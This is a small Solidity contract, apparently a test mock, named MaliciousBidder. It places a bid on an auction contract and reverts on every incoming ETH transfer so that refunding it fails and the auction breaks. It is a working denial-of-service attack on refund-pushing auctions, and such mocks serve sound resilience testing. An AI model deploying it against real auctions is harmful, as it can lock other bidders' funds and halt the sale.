// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract MaliciousBidder {
    function bid(
        address auctionManager,
        uint256 auctionId,
        uint256 amount
    ) external payable {
        // 调用拍卖合约进行出价
        (bool success, ) = auctionManager.call{value: amount}(
            abi.encodeWithSignature(
                "placeBid(uint256,uint256,address)",
                auctionId,
                0,
                address(0)
            )
        );
        require(success, "Bid failed");
    }

    // 重点：拒绝接收任何 ETH 转账
    receive() external payable {
        revert("I refuse to take money and want to break the auction!");
    }
}
